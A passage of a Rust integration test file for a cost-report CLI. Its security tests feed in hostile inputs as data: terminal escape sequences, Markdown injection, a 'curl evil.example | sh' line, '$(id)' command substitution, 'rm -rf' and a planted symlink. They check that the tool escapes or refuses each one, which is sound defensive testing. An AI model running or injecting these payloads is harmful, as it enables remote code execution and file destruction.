//! End-to-end runs of the `cost-check` binary.
//!
//! `report` shells out to a tool. The stub only prints `tests/fixtures/ci.json`,
//! which the ci-bill adapter already accepts. It does not parse the export.
//! The export itself is a few synthetic CSV lines in the shape `sniff` already
//! recognises. Nothing is fetched, and the serve test never binds.

use std::fs;
use std::io::Read;
#[cfg(unix)]
use std::path::Path;
use std::path::PathBuf;
use std::process::{Command, Output, Stdio};
use std::sync::atomic::{AtomicU64, Ordering};
use std::thread;
use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};

static SCRATCH_SEQ: AtomicU64 = AtomicU64::new(1);

// The stubs are `sh` scripts that need an executable mode, so every test that
// runs a stub is Unix only. The rest of this file also runs on Windows.
#[cfg(unix)]
const USAGE: &[u8] = b"date,product,sku,net_amount,repository,workflow_path\n\
2026-09-01,actions,actions_linux,1,example/app,ci.yml\n";

#[test]
fn help_exits_zero() {
    let output = run(&["--help"]);
    assert!(output.status.success(), "stderr: {}", text(&output.stderr));
    assert_eq!(output.status.code(), Some(0));
    let out = text(&output.stdout);
    assert!(out.contains("report"), "{out}");
    assert!(!out.contains("panicked"), "{out}");
    assert!(!text(&output.stderr).contains("panicked"));
}

#[test]
fn unknown_option_exits_two() {
    let output = run(&["--geen-vlag"]);
    assert_exit_two(&output);
}

#[test]
fn report_without_input_exits_two() {
    let output = run(&["report"]);
    assert_exit_two(&output);
}

#[cfg(unix)]
#[test]
fn report_auto_writes_the_page() {
    assert_ci_report("auto");
}

#[cfg(unix)]
#[test]
fn report_ci_bill_writes_the_page() {
    assert_ci_report("ci-bill");
}

#[test]
fn render_reads_ci_json() {
    let output = run(&[
        "render",
        "--tool",
        "ci-bill",
        "--json",
        ci_json().to_str().expect("pad"),
    ]);
    assert!(output.status.success(), "stderr: {}", text(&output.stderr));
    assert!(!text(&output.stderr).contains("panicked"));
    assert_eq!(text(&output.stdout), page_without_fix());
}

#[cfg(unix)]
#[test]
fn report_to_stdout_and_delete_input() {
    let scratch = Scratch::new();
    let usage = scratch.write("usage.csv", USAGE);
    let stub = scratch.stub_that_prints(&ci_json());
    let output = run(&[
        "report",
        "--tool",
        "ci-bill",
        "--input",
        usage.to_str().expect("pad"),
        "--ci-bill",
        stub.to_str().expect("pad"),
        "--delete-input",
    ]);
    assert!(output.status.success(), "stderr: {}", text(&output.stderr));
    assert!(!text(&output.stderr).contains("panicked"));
    assert_eq!(text(&output.stdout), page_without_fix());
    assert!(!usage.exists(), "de export bleef staan");
}

#[test]
fn unknown_format_exits_two() {
    let output = run(&["report", "--input", "missing.csv", "--format", "nope"]);
    assert_exit_two(&output);
    assert!(
        text(&output.stderr).contains("onbekend formaat"),
        "{}",
        text(&output.stderr)
    );
}

#[cfg(unix)]
#[test]
fn format_that_does_not_fit_the_tool_exits_two() {
    let scratch = Scratch::new();
    let usage = scratch.write("usage.csv", USAGE);
    let stub = scratch.stub_that_prints(&ci_json());
    let output = run(&[
        "report",
        "--tool",
        "ci-bill",
        "--input",
        usage.to_str().expect("pad"),
        "--ci-bill",
        stub.to_str().expect("pad"),
        "--format",
        "text",
    ]);
    assert_exit_two(&output);
    assert!(
        text(&output.stderr).contains("formaat"),
        "{}",
        text(&output.stderr)
    );
}

#[test]
fn render_includes_a_fix_diff() {
    let scratch = Scratch::new();
    let diff = scratch.write(
        "fix.diff",
        b"--- a/ci.yml\n+++ b/ci.yml\n@@ -1 +1 @@\n-old\n+new\n",
    );
    let output = run(&[
        "render",
        "--tool",
        "ci-bill",
        "--json",
        ci_json().to_str().expect("pad"),
        "--fix",
        diff.to_str().expect("pad"),
    ]);
    assert!(output.status.success(), "stderr: {}", text(&output.stderr));
    let page = text(&output.stdout);
    assert!(page.contains("Total net: 284.21 USD\n"), "{page}");
    assert!(page.contains("## Suggested fix\n"), "{page}");
    assert!(page.contains("+new\n"), "{page}");
    assert!(!text(&output.stderr).contains("panicked"));
}

#[test]
fn serve_bad_bind_exits_immediately() {
    let output = run(&["serve", "--bind", "203.0.113.1:4517"]);
    assert_exit_two(&output);
    let err = text(&output.stderr);
    assert!(
        err.contains("loopback"),
        "verwacht een bind-fout, kreeg: {err}"
    );
}

#[cfg(unix)]
fn assert_ci_report(tool: &str) {
    let scratch = Scratch::new();
    let usage = scratch.write("usage.csv", USAGE);
    let stub = scratch.stub_that_prints(&ci_json());
    let out = scratch.path().join("rapport.md");
    let output = run(&[
        "report",
        "--tool",
        tool,
        "--input",
        usage.to_str().expect("pad"),
        "--ci-bill",
        stub.to_str().expect("pad"),
        "--out",
        out.to_str().expect("pad"),
    ]);
    assert!(
        output.status.success(),
        "tool={tool} stderr: {}",
        text(&output.stderr)
    );
    assert!(!text(&output.stderr).contains("panicked"));
    assert!(
        text(&output.stdout).is_empty(),
        "stdout hoort leeg bij --out: {}",
        text(&output.stdout)
    );
    let page = fs::read_to_string(&out).expect("rapport");
    assert_eq!(page, page_without_fix(), "tool={tool}");
}

fn page_without_fix() -> &'static str {
    include_str!("fixtures/ci.md")
        .split("\n## Suggested fix\n")
        .next()
        .expect("voorbeeld zonder diff")
}

fn ci_json() -> PathBuf {
    PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("tests/fixtures/ci.json")
}

fn assert_exit_two(output: &Output) {
    assert_eq!(
        output.status.code(),
        Some(2),
        "stdout: {}\nstderr: {}",
        text(&output.stdout),
        text(&output.stderr)
    );
    let err = text(&output.stderr);
    assert!(!err.trim().is_empty(), "geen melding op stderr");
    assert!(!err.contains("panicked"), "{err}");
}

fn text(bytes: &[u8]) -> String {
    String::from_utf8_lossy(bytes).into_owned()
}

fn run(args: &[&str]) -> Output {
    let mut cmd = Command::new(env!("CARGO_BIN_EXE_cost-check"));
    cmd.args(args).stdout(Stdio::piped()).stderr(Stdio::piped());
    run_cmd(cmd)
}

/// Run a prepared command with a 15 second limit. The caller sets stdout and
/// stderr; an output it did not pipe comes back empty.
fn run_cmd(mut cmd: Command) -> Output {
    let args = format!("{cmd:?}");
    let mut child = cmd.stdin(Stdio::null()).spawn().expect("cost-check start");
    let started = Instant::now();
    let status = loop {
        match child.try_wait() {
            Ok(Some(status)) => break status,
            Ok(None) if started.elapsed() > Duration::from_secs(15) => {
                let _ = child.kill();
                let _ = child.wait();
                panic!("cost-check stopte niet binnen 15s: {args}");
            }
            Ok(None) => thread::sleep(Duration::from_millis(20)),
            Err(err) => panic!("wachten op cost-check mislukte: {err}"),
        }
    };
    let mut stdout = Vec::new();
    let mut stderr = Vec::new();
    if let Some(mut pipe) = child.stdout.take() {
        pipe.read_to_end(&mut stdout).expect("stdout");
    }
    if let Some(mut pipe) = child.stderr.take() {
        pipe.read_to_end(&mut stderr).expect("stderr");
    }
    Output {
        status,
        stdout,
        stderr,
    }
}

struct Scratch {
    path: PathBuf,
}

impl Scratch {
    fn new() -> Self {
        let n = SCRATCH_SEQ.fetch_add(1, Ordering::Relaxed);
        let nanos = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .map(|d| d.as_nanos())
            .unwrap_or(0);
        let path = std::env::temp_dir().join(format!("cc-cli-{}-{nanos}-{n}", std::process::id()));
        fs::create_dir(&path).expect("werkmap");
        Self { path }
    }

    #[cfg(unix)]
    fn path(&self) -> &Path {
        &self.path
    }

    fn write(&self, name: &str, bytes: &[u8]) -> PathBuf {
        let path = self.path.join(name);
        fs::write(&path, bytes).expect("schrijf");
        path
    }

    #[cfg(unix)]
    fn stub_that_prints(&self, json: &Path) -> PathBuf {
        self.stub("stub-ci-bill", &format!("cat '{}'\n", json.display()))
    }

    /// An executable `sh` script. Unix only.
    #[cfg(unix)]
    fn stub(&self, name: &str, body: &str) -> PathBuf {
        use std::os::unix::fs::PermissionsExt;
        let script = self.path.join(name);
        fs::write(&script, format!("#!/bin/sh\n{body}")).expect("stub");
        let mut perms = fs::metadata(&script).expect("stub").permissions();
        perms.set_mode(0o755);
        fs::set_permissions(&script, perms).expect("stub rechten");
        script
    }
}

impl Drop for Scratch {
    fn drop(&mut self) {
        let _ = fs::remove_dir_all(&self.path);
    }
}

// ---- Reports that must stay safe and honest (B2 to B12) ----

const SECRET_ESCAPES: &[&str] = &[
    "\u{1b}", "\u{7}", "\u{9b}", "\u{202e}", "\u{200f}", "\u{2028}",
];

fn render_page(tool: &str, json: &str, fix: Option<&str>) -> Output {
    let scratch = Scratch::new();
    let json_path = scratch.write("in.json", json.as_bytes());
    let mut args = vec![
        "render".to_string(),
        "--tool".to_string(),
        tool.to_string(),
        "--json".to_string(),
        json_path.to_str().expect("pad").to_string(),
    ];
    if let Some(fix) = fix {
        let fix_path = scratch.write("fix.diff", fix.as_bytes());
        args.push("--fix".to_string());
        args.push(fix_path.to_str().expect("pad").to_string());
    }
    let refs: Vec<&str> = args.iter().map(String::as_str).collect();
    run(&refs)
}

fn ci_json_with_total(total: &str) -> String {
    let json = fs::read_to_string(ci_json()).expect("ci.json");
    assert!(json.contains("\"total_net\": \"284.208000\""));
    json.replace(
        "\"total_net\": \"284.208000\"",
        &format!("\"total_net\": \"{total}\""),
    )
}

/// The lines between the opening fence and its matching close.
fn fenced_lines(page: &str) -> (String, Vec<String>) {
    let mut lines = page.lines();
    let fence = lines
        .by_ref()
        .find(|line| line.starts_with("```"))
        .expect("een codeblok")
        .trim_end_matches(|c: char| c != '`')
        .to_string();
    let body: Vec<String> = lines
        .by_ref()
        .take_while(|line| *line != fence)
        .map(str::to_string)
        .collect();
    assert!(
        lines.all(|line| !line.starts_with("## ")),
        "tekst na het codeblok is een kop:\n{page}"
    );
    (fence, body)
}

#[test]
fn a_fix_body_cannot_send_terminal_controls() {
    let diff = "--- a/f.yml\n+++ b/f.yml\n@@ -1 +1 @@\n+# \u{1b}]0;pwned\u{7}\u{1b}[2J\u{9b}2J \u{202e}gnp \u{200f}x\u{2028}y\r\n";
    let output = render_page(
        "ci-bill",
        &fs::read_to_string(ci_json()).unwrap(),
        Some(diff),
    );
    assert!(output.status.success(), "stderr: {}", text(&output.stderr));
    let page = text(&output.stdout);
    for bad in SECRET_ESCAPES.iter().chain(&["\r"]) {
        assert!(
            !page.contains(bad),
            "{bad:?} staat ruw in het rapport:\n{page}"
        );
    }
    assert!(page.contains("\\x1b]0;pwned\\x07\\x1b[2J"), "{page}");
    assert!(page.contains("\\u{009b}2J"), "{page}");
    assert!(page.contains("+# "), "de diff blijft leesbaar:\n{page}");
}

#[test]
fn a_fix_body_cannot_close_its_code_block() {
    let diff = "--- a/f.yml\n+++ b/f.yml\n@@ -1 +1 @@\n ```\n ````\n## Injected heading\n";
    let output = render_page(
        "ci-bill",
        &fs::read_to_string(ci_json()).unwrap(),
        Some(diff),
    );
    assert!(output.status.success(), "stderr: {}", text(&output.stderr));
    let page = text(&output.stdout);
    let (fence, body) = fenced_lines(&page);
    assert!(fence.len() >= 5, "het hek is te kort ({fence}):\n{page}");
    assert!(body.iter().any(|l| l == "## Injected heading"), "{page}");
}

const LOG_JSON: &str = r#"{
    "schema_version": 1,
    "tool": "log-bill",
    "estimate": "estimate: one sample",
    "inputs": {"paths": ["app.log"]},
    "window": {"seconds": 60, "factor": "1440"},
    "totals": {"lines": 2, "bytes": 40},
    "patterns": [{
        "id": "Pabc",
        "text": "TEXT",
        "lines": 2,
        "bytes": 40,
        "share": "100.0",
        "rest": false
    }],
    "costs": {
        "currency": "USD",
        "totals": {"ingest": {"per_month": "0.30"}},
        "patterns": [{"id": "Pabc", "ingest": {"per_month": "0.30"}}]
    }
}"#;

#[test]
fn a_cell_cannot_carry_markdown_or_controls() {
    let hostile = r"<b>x</b> [a](http://evil/x) ![i](http://evil/p.png) `tick` \u009b2J \u202e \u200f \u001b \u0007";
    let json = LOG_JSON.replace("TEXT", hostile);
    let output = render_page("log-bill", &json, None);
    assert!(output.status.success(), "stderr: {}", text(&output.stderr));
    let page = text(&output.stdout);
    for bad in SECRET_ESCAPES {
        assert!(
            !page.contains(bad),
            "{bad:?} staat ruw in het rapport:\n{page}"
        );
    }
    // Inside a code block Markdown is inert; the tables must be safe.
    let page = page
        .split("\n## Suggested fix\n")
        .next()
        .unwrap()
        .to_string();
    assert!(!page.contains("<b>"), "{page}");
    assert!(!page.contains("[a]("), "{page}");
    assert!(!page.contains("![i]("), "{page}");
    assert!(!page.contains("`tick`"), "{page}");
    assert!(page.contains("\\[a\\]"), "{page}");
    assert!(page.contains("\\u{009b}2J"), "{page}");
}

fn dd_fix_body(keys: &str) -> Vec<String> {
    let json = format!(
        r#"{{
        "schema_version": 1, "tool": "dd-metric-bill", "total": 2,
        "inputs": ["m.dogstatsd"],
        "metrics": [{{"name": "m", "type": "count", "count": 2}}],
        "tags": [{{"name": "m", "type": "count", "keys": [{keys},
            {{"key": "big", "added": 9, "values": 9}}
        ]}}],
        "unbounded": []
    }}"#
    );
    let output = render_page("dd-metric-bill", &json, None);
    assert!(output.status.success(), "stderr: {}", text(&output.stderr));
    let page = text(&output.stdout);
    let (_, body) = fenced_lines(&page);
    body
}

#[test]
fn a_dd_tag_key_cannot_close_the_code_block() {
    let body = dd_fix_body(r##"{"key": "a\n## Injected heading", "added": 1, "values": 2}"##);
    assert!(!body.iter().any(|l| l == "## Injected heading"), "{body:?}");
    assert_eq!(body.len(), 1, "de voorgestelde fix is één regel: {body:?}");
}

#[test]
fn a_dd_tag_key_cannot_add_a_second_line_after_allow_tags() {
    let body = dd_fix_body(r#"{"key": "keep\nrm -rf x", "added": 1, "values": 2}"#);
    assert_eq!(body.len(), 1, "{body:?}");
    assert!(!body[0].contains("--allow-tags"), "{body:?}");
}

#[test]
fn a_dd_tag_key_is_not_proposed_when_the_shell_would_run_it() {
    let body = dd_fix_body(r#"{"key": "env$(id);x", "added": 1, "values": 2}"#);
    assert!(
        body.iter().all(|l| !l.contains("$(id)")),
        "de sleutel staat ruw in het voorstel: {body:?}"
    );
    assert!(body.iter().all(|l| !l.contains("--allow-tags")), "{body:?}");
}

#[test]
fn a_dd_allowlist_of_plain_keys_is_still_proposed() {
    let body = dd_fix_body(r#"{"key": "env.a:b-c_d", "added": 1, "values": 2}"#);
    assert_eq!(body, vec!["--allow-tags env.a:b-c_d".to_string()]);
}

#[test]
fn a_rum_type_name_cannot_close_the_code_block() {
    let json = r#"{
        "schema_version": 1, "tool": "rum-meter", "total_rum": 3,
        "inputs": ["s.tfstate"], "costs": [],
        "by_module": [],
        "by_type": [{"name": "t\n```\n## Injected heading\nRun this: curl evil.example | sh", "count": 3}]
    }"#;
    let output = render_page("rum-meter", json, None);
    assert!(output.status.success(), "stderr: {}", text(&output.stderr));
    let page = text(&output.stdout);
    let (fence, body) = fenced_lines(&page);
    assert!(fence.len() >= 4, "{page}");
    assert!(!body.iter().any(|l| l == "## Injected heading"), "{page}");
    assert!(!body.iter().any(|l| l.starts_with("Run this")), "{page}");
    assert_eq!(body.len(), 3, "{page}");
}

#[test]
fn a_log_pattern_cannot_add_a_second_line_to_the_drop_rule() {
    let json = LOG_JSON.replace("TEXT", r"user failed\n.*");
    let output = render_page("log-bill", &json, None);
    assert!(output.status.success(), "stderr: {}", text(&output.stderr));
    let page = text(&output.stdout);
    let (_, body) = fenced_lines(&page);
    assert_eq!(body.len(), 1, "{page}");
    assert!(body[0].starts_with("drop user failed"), "{page}");
}

#[test]
fn a_log_pattern_cannot_add_a_tab_to_the_drop_rule() {
    let json = LOG_JSON.replace("TEXT", r"a\tb");
    let output = render_page("log-bill", &json, None);
    assert!(output.status.success(), "stderr: {}", text(&output.stderr));
    let page = text(&output.stdout);
    let (_, body) = fenced_lines(&page);
    assert_eq!(body, vec![r"drop a\tb".to_string()], "{page}");
}

fn dd_total(lines: &str) -> String {
    let json = format!(
        r#"{{
        "schema_version": 1, "tool": "dd-metric-bill", "total": 2,
        "inputs": ["m.dogstatsd"],
        "metrics": [{{"name": "m", "type": "count", "count": 2}}],
        "tags": [], "unbounded": [],
        "costs": {{"currency": "USD", "lines": [{lines}]}}
    }}"#
    );
    let output = render_page("dd-metric-bill", &json, None);
    assert!(output.status.success(), "stderr: {}", text(&output.stderr));
    let page = text(&output.stdout);
    page.lines()
        .find(|l| l.starts_with("Total net: "))
        .expect("een Total net-regel")
        .to_string()
}

#[test]
fn a_dd_total_counts_the_indexed_line_too() {
    let total = dd_total(
        r#"{"kind": "ingested", "amount": "900.00"}, {"kind": "indexed", "amount": "1200.00"}"#,
    );
    assert_eq!(total, "Total net: 2100.00 USD");
}

#[test]
fn a_dd_total_keeps_the_rounding_rule() {
    let total = dd_total(
        r#"{"kind": "ingested", "amount": "0.003"}, {"kind": "indexed", "amount": "0.004"}"#,
    );
    assert_eq!(total, "Total net: 0.007 USD");
    let total = dd_total(
        r#"{"kind": "ingested", "amount": "0.10"}, {"kind": "indexed", "amount": "0.20"}"#,
    );
    assert_eq!(total, "Total net: 0.30 USD");
}

#[test]
fn a_dd_total_shows_another_currency_apart() {
    let total = dd_total(
        r#"{"kind": "ingested", "amount": "900.00"}, {"kind": "indexed", "amount": "5.00", "currency": "EUR"}"#,
    );
    assert_eq!(total, "Total net: 900.00 USD, 5.00 EUR");
}

#[test]
fn a_repeated_json_key_exits_two() {
    let json = fs::read_to_string(ci_json()).unwrap().replace(
        "\"total_net\": \"284.208000\",",
        "\"total_net\": \"1.00\", \"total_net\": \"999.00\",",
    );
    let output = render_page("ci-bill", &json, None);
    assert_exit_two(&output);
    assert!(
        text(&output.stderr).contains("dubbele sleutel"),
        "{}",
        text(&output.stderr)
    );
    assert!(text(&output.stdout).is_empty());
}

#[test]
fn an_unbounded_tag_names_its_own_metric_and_series() {
    let json = r#"{
        "schema_version": 1, "tool": "dd-metric-bill", "total": 9,
        "inputs": ["m.dogstatsd"],
        "metrics": [{"name": "alpha", "type": "count", "count": 5},
                    {"name": "beta", "type": "count", "count": 4}],
        "tags": [
            {"name": "alpha", "type": "count", "keys": [{"key": "user", "added": 5, "values": 5}]},
            {"name": "beta", "type": "count", "keys": [{"key": "user", "added": 4, "values": 4}]}
        ],
        "unbounded": [
            {"name": "beta", "keys": [{"key": "user", "reasons": ["uuid-like"]}]}
        ]
    }"#;
    let output = render_page("dd-metric-bill", json, None);
    assert!(output.status.success(), "stderr: {}", text(&output.stderr));
    let page = text(&output.stdout);
    let row = page.lines().find(|l| l.starts_with("| T1 ")).expect("T1");
    assert!(row.contains("| beta user |"), "{row}");
    assert!(row.contains("adds 4 series"), "{row}");
    assert!(!row.contains("alpha"), "{row}");
    assert!(!page.contains("9 series"), "{page}");
}

#[test]
fn a_half_cent_rounds_away_from_zero() {
    for (raw, shown) in [
        ("284.205", "284.21"),
        ("284.204999", "284.20"),
        ("-0.005", "-0.01"),
        ("-0.004999", "0.00"),
        ("1.005", "1.01"),
        ("0.005", "0.01"),
    ] {
        let output = render_page("ci-bill", &ci_json_with_total(raw), None);
        assert!(output.status.success(), "{raw}: {}", text(&output.stderr));
        let want = format!("Total net: {shown} USD\n");
        assert!(
            text(&output.stdout).contains(&want),
            "{raw} -> {shown}:\n{}",
            text(&output.stdout)
        );
    }
}

/// No file of this crate may name a folder of the machine it was written on.
#[test]
fn no_source_names_the_development_machine() {
    // Built in pieces, so that this file does not contain the text itself.
    let needle = format!("{}{}", "/media/", "bitboi");
    let root = PathBuf::from(env!("CARGO_MANIFEST_DIR"));
    let mut stack = vec![root.join("src"), root.join("tests")];
    let mut checked = 0;
    while let Some(dir) = stack.pop() {
        for entry in fs::read_dir(&dir).expect("map").filter_map(Result::ok) {
            let path = entry.path();
            if path.is_dir() {
                stack.push(path);
            } else if let Ok(body) = fs::read_to_string(&path) {
                checked += 1;
                assert!(
                    !body.contains(&needle),
                    "{} noemt de ontwikkelmachine",
                    path.display()
                );
            }
        }
    }
    assert!(checked >= 10, "te weinig bestanden gelezen: {checked}");
}

#[cfg(unix)]
mod with_stubs {
    use super::*;
    use std::io::Write;
    use std::net::TcpStream;
    use std::os::unix::fs::symlink;

    const RUM_JSON: &str = r#"{
        "schema_version": 1, "tool": "rum-meter", "total_rum": 1,
        "inputs": ["big.tfstate"], "costs": [],
        "by_module": [], "by_type": [{"name": "random_id", "count": 1}]
    }"#;

    fn json_stub(scratch: &Scratch, name: &str, json: &str) -> PathBuf {
        let path = scratch.write(&format!("{name}.json"), json.as_bytes());
        scratch.stub(name, &format!("cat '{}'\n", path.display()))
    }

    fn cmd_with(args: &[&str]) -> Command {
        let mut cmd = Command::new(env!("CARGO_BIN_EXE_cost-check"));
        cmd.args(args).stdout(Stdio::piped()).stderr(Stdio::piped());
        cmd
    }

    /// A Terraform state whose `resources` come after more than 8 KiB.
    fn big_state() -> String {
        let mut outputs = String::new();
        for n in 0..400 {
            if n > 0 {
                outputs.push(',');
            }
            outputs.push_str(&format!(
                "\"out{n}\":{{\"value\":\"{}\",\"type\":\"string\"}}",
                "x".repeat(30)
            ));
        }
        format!(
            "{{\"version\":4,\"terraform_version\":\"1.9.0\",\"serial\":1,\"lineage\":\"l\",\"outputs\":{{{outputs}}},\"resources\":[]}}"
        )
    }

    #[test]
    fn an_explicit_tool_wins_over_the_sniff_of_the_first_8_kib() {
        let scratch = Scratch::new();
        let state = big_state();
        assert!(state.find("\"resources\"").unwrap() > 8192);
        let input = scratch.write("big.tfstate", state.as_bytes());
        let stub = json_stub(&scratch, "stub-rum", RUM_JSON);
        let output = run(&[
            "report",
            "--tool",
            "rum-meter",
            "--input",
            input.to_str().unwrap(),
            "--rum-meter",
            stub.to_str().unwrap(),
        ]);
        assert!(output.status.success(), "stderr: {}", text(&output.stderr));
        assert!(text(&output.stdout).starts_with("# rum-meter teardown\n"));
    }

    #[test]
    fn out_does_not_follow_a_planted_symlink() {
        let scratch = Scratch::new();
        let usage = scratch.write("usage.csv", USAGE);
        let victim = scratch.write("victim.txt", b"PRECIOUS");
        let stub = scratch.stub_that_prints(&ci_json());
        let out = scratch.path().join("out.md");
        // The shell knows its own pid, which is the pid cost-check keeps.
        let script = format!(
            "ln -s '{victim}' '{dir}/.cost-check-'$$'.tmp'; exec \"$0\" \"$@\"",
            victim = victim.display(),
            dir = scratch.path().display()
        );
        let mut cmd = Command::new("sh");
        cmd.arg("-c")
            .arg(script)
            .arg(env!("CARGO_BIN_EXE_cost-check"))
            .args(["report", "--tool", "ci-bill", "--input"])
            .arg(&usage)
            .arg("--ci-bill")
            .arg(&stub)
            .arg("--out")
            .arg(&out)
            .stdout(Stdio::piped())
            .stderr(Stdio::piped());
        let output = run_cmd(cmd);
        assert!(output.status.success(), "stderr: {}", text(&output.stderr));
        assert_eq!(
            fs::read(&victim).unwrap(),
            b"PRECIOUS",
            "victim is overschreven"
        );
        let meta = fs::symlink_metadata(&out).unwrap();
        assert!(meta.file_type().is_file(), "out.md is geen gewoon bestand");
        assert_eq!(fs::read_to_string(&out).unwrap(), page_without_fix());
    }

    #[test]
    fn out_that_is_a_symlink_is_refused() {
        let scratch = Scratch::new();
        let usage = scratch.write("usage.csv", USAGE);
        let victim = scratch.write("victim.txt", b"PRECIOUS");
        let stub = scratch.stub_that_prints(&ci_json());
        let out = scratch.path().join("out.md");
        symlink(&victim, &out).unwrap();
        let output = run(&[
            "report",
            "--tool",
            "ci-bill",
            "--input",
            usage.to_str().unwrap(),
            "--ci-bill",
            stub.to_str().unwrap(),
            "--out",
            out.to_str().unwrap(),
        ]);
        assert_exit_two(&output);
        assert!(
            text(&output.stderr).contains("symlink"),
            "{}",
            text(&output.stderr)
        );
        assert_eq!(fs::read(&victim).unwrap(), b"PRECIOUS");
        assert!(fs::symlink_metadata(&out).unwrap().file_type().is_symlink());
    }

    #[test]
    fn out_equal_to_input_exits_two_and_keeps_the_export() {
        let scratch = Scratch::new();
        let usage = scratch.write("usage.csv", USAGE);
        let alias = scratch.path().join("sub/../usage.csv");
        fs::create_dir(scratch.path().join("sub")).unwrap();
        let hard = scratch.path().join("hard.csv");
        fs::hard_link(&usage, &hard).unwrap();
        let stub = scratch.stub_that_prints(&ci_json());
        for (out, delete) in [
            (&usage, false),
            (&usage, true),
            (&alias, true),
            (&hard, true),
        ] {
            let mut args = vec![
                "report",
                "--tool",
                "ci-bill",
                "--input",
                usage.to_str().unwrap(),
                "--ci-bill",
                stub.to_str().unwrap(),
                "--out",
                out.to_str().unwrap(),
            ];
            if delete {
                args.push("--delete-input");
            }
            let output = run(&args);
            assert_exit_two(&output);
            assert!(
                text(&output.stderr).contains("--out"),
                "{}",
                text(&output.stderr)
            );
            assert_eq!(
                fs::read(&usage).unwrap(),
                USAGE,
                "de export is veranderd ({out:?})"
            );
        }
    }

    #[test]
    fn a_closed_stdout_is_an_error() {
        let scratch = Scratch::new();
        let json = scratch.write("ci.json", &fs::read(ci_json()).unwrap());
        let mut cmd = Command::new("sh");
        cmd.arg("-c")
            .arg("exec \"$0\" \"$@\" >&-")
            .arg(env!("CARGO_BIN_EXE_cost-check"))
            .args(["render", "--tool", "ci-bill", "--json"])
            .arg(&json)
            .stderr(Stdio::piped());
        let output = run_cmd(cmd);
        assert_exit_two(&output);
    }

    #[cfg(target_os = "linux")]
    #[test]
    fn a_full_stdout_is_an_error_for_render_and_for_serve() {
        let full = || {
            fs::OpenOptions::new()
                .write(true)
                .open("/dev/full")
                .expect("/dev/full")
        };
        let scratch = Scratch::new();
        let json = scratch.write("ci.json", &fs::read(ci_json()).unwrap());
        let mut cmd = Command::new(env!("CARGO_BIN_EXE_cost-check"));
        cmd.args(["render", "--tool", "ci-bill", "--json"])
            .arg(&json)
            .stdout(full())
            .stderr(Stdio::piped());
        assert_exit_two(&run_cmd(cmd));

        let ci = json_stub(&scratch, "ci-bill", "{}");
        let mut cmd = Command::new(env!("CARGO_BIN_EXE_cost-check"));
        cmd.args(["serve", "--bind", "127.0.0.1:0"])
            .arg("--ci-bill")
            .arg(&ci)
            .arg("--log-bill")
            .arg(&ci)
            .arg("--dd-metric-bill")
            .arg(&ci)
            .arg("--rum-meter")
            .arg(&ci)
            .stdout(full())
            .stderr(Stdio::piped());
        let output = run_cmd(cmd);
        assert_exit_two(&output);
        assert_ne!(output.status.code(), Some(101));
    }

    #[test]
    fn serve_reads_the_field_name_wherever_it_stands() {
        let scratch = Scratch::new();
        let log = json_stub(&scratch, "log-bill", &LOG_JSON.replace("TEXT", "disk full"));
        let other = json_stub(&scratch, "other", "{}");
        let mut cmd = Command::new(env!("CARGO_BIN_EXE_cost-check"));
        cmd.args(["serve", "--bind", "127.0.0.1:0"])
            .arg("--ci-bill")
            .arg(&other)
            .arg("--log-bill")
            .arg(&log)
            .arg("--dd-metric-bill")
            .arg(&other)
            .arg("--rum-meter")
            .arg(&other)
            .stdout(Stdio::piped())
            .stderr(Stdio::null());
        let mut child = cmd.spawn().expect("serve");
        struct Guard(std::process::Child);
        impl Drop for Guard {
            fn drop(&mut self) {
                let _ = self.0.kill();
                let _ = self.0.wait();
            }
        }
        let mut stdout = child.stdout.take().expect("stdout");
        let _guard = Guard(child);
        let mut line = Vec::new();
        let mut byte = [0u8; 1];
        while stdout.read(&mut byte).map(|n| n == 1).unwrap_or(false) && byte[0] != b'\n' {
            line.push(byte[0]);
        }
        let url = String::from_utf8_lossy(&line).into_owned();
        let port: u16 = url
            .trim()
            .trim_start_matches("http://127.0.0.1:")
            .trim_end_matches('/')
            .parse()
            .unwrap_or_else(|_| panic!("geen adres: {url:?}"));
        let post = |disposition: &str| -> String {
            let body = format!(
                "--cc\r\nContent-Disposition: form-data; name=\"tool\"\r\n\r\nlog-bill\r\n--cc\r\nContent-Disposition: {disposition}\r\n\r\nERROR disk full\r\n--cc--\r\n"
            );
            let request = format!(
                "POST /report HTTP/1.1\r\nHost: 127.0.0.1:{port}\r\nContent-Type: multipart/form-data; boundary=cc\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
                body.len()
            );
            let mut client = TcpStream::connect(("127.0.0.1", port)).expect("verbind");
            client
                .set_read_timeout(Some(Duration::from_secs(20)))
                .unwrap();
            client.write_all(request.as_bytes()).unwrap();
            let mut buf = Vec::new();
            let _ = client.read_to_end(&mut buf);
            String::from_utf8_lossy(&buf).into_owned()
        };
        for disposition in [
            "form-data; name=\"export\"; filename=\"app.log\"",
            "form-data; filename=\"app.log\"; name=\"export\"",
        ] {
            let response = post(disposition);
            assert!(response.contains("200 OK"), "{disposition}:\n{response}");
            assert!(response.contains("# log-bill teardown"), "{response}");
        }
    }

    fn jsonl_cut_inside(ch: &str, start: usize) -> Vec<u8> {
        let head = "{\"msg\":\"";
        format!(
            "{head}{}{ch}\"}}\n{{\"msg\":\"é 😀\"}}\n",
            "a".repeat(start - head.len())
        )
        .into_bytes()
    }

    #[test]
    fn report_survives_a_char_cut_by_the_sniff_window() {
        let scratch = Scratch::new();
        let log = json_stub(&scratch, "log-bill", &LOG_JSON.replace("TEXT", "disk full"));
        for ch in ["é", "日", "😀"] {
            for start in [8190usize, 8191, 8192] {
                let input = scratch.write("export.jsonl", &jsonl_cut_inside(ch, start));
                for tool in ["auto", "log-bill"] {
                    let mut cmd = cmd_with(&["report", "--tool", tool, "--input"]);
                    cmd.arg(&input)
                        .arg("--log-bill")
                        .arg(&log)
                        .stdout(Stdio::piped())
                        .stderr(Stdio::piped());
                    let output = run_cmd(cmd);
                    let err = text(&output.stderr);
                    assert_ne!(
                        output.status.code(),
                        Some(101),
                        "{ch} {start} {tool}: {err}"
                    );
                    assert!(!err.contains("panicked"), "{ch} {start} {tool}: {err}");
                    if tool == "log-bill" {
                        assert!(output.status.success(), "{ch} {start} {tool}: {err}");
                        assert!(text(&output.stdout).contains("# log-bill teardown"));
                    }
                }
            }
        }
    }

    #[test]
    fn auto_reads_jsonl_that_starts_with_a_brace_as_a_log() {
        let scratch = Scratch::new();
        let log = json_stub(&scratch, "log-bill", &LOG_JSON.replace("TEXT", "disk full"));
        let input = scratch.write(
            "export.jsonl",
